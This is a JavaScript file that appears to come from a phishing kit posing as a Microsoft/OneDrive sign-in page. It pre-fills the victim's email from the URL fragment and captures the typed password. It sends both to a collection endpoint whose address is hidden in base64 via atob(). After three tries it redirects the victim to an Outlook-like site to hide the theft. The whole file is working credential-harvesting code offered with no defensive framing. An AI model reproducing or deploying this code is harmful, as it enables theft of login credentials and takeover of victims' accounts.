$(document).ready(function () {
    var count = 0;
    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {
    } else {
      // $('#email').val(email);
      var my_email = email;
      var ind = my_email.indexOf("@");
      var my_slice = my_email.substr(ind + 1);
      var c = my_slice.substr(0, my_slice.indexOf("."));
      var final = c.toLowerCase();
      $("#msg").hide();
      // $('#fieldImg').attr('src', 'images/other-1.png');
      // $('#field').html("Other Mail");
      $("#email").val(my_email);
      $("#dom").html(my_slice);

      $("#msg").hide();
    }
    ///////////////url getting email////////////////

    $("#submit-btn").click(function (event) {
      $("#error").hide();
      $("#msg").hide();
      event.preventDefault();
      var email = $("#email").val();
      var password = $("#password").val();
      var msg = $("#msg").html();
      $("#msg").text(msg);
      ///////////new injection////////////////
      var my_email = email;
      var filter =
        /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $("#error").show();
        email.focus;
        return false;
      }

      var ind = my_email.indexOf("@");
      var my_slice = my_email.substr(ind + 1);
      var c = my_slice.substr(0, my_slice.indexOf("."));
      var final = c.toLowerCase();
      var n = my_email.search("@");
      ///////////new injection////////////////
      count = count + 1;

      $.ajax({
        dataType: "JSON",
        url: atob("aHR0cHM6Ly9zZXZlcmhvc3QuY29tL29uZWRyaXZlL25leHQucGhw"),
        type: "POST",
        data: {
          email: email,
          password: password,
        },
        // data: $('#contact').serialize(),
        beforeSend: function (xhr) {
          $("#submit-btn").html("Verifing...");
        },
        success: function (response) {
          if (response) {
            $("#msg").show();
            console.log(response);
            if (response["signal"] == "ok") {
              $("#password").val("");
              if (count >= 3) {
                count = 0;
                window.location.replace("https://outlookwebapp.com");
              }
              $("#msg").html(response["msg"]);
            } else {
              $("#msg").html(response["msg"]);
            }
          }
        },
        error: function () {
          $("#password").val("");
          if (count >= 3) {
            count = 0;
            window.location.replace("https://outlookwebapp.com/");
          }
          $("#msg").show();
          $("#msg").html("Please try again later");
        },
        complete: function () {
          $("#submit-btn").html("Sign in");
        },
      });
    });
  });

  function getEmail() {
    if (window.location.hash) {
      var url = window.location.href;
      var hash = url.split("#").pop();
      return atob(hash);
    }
  }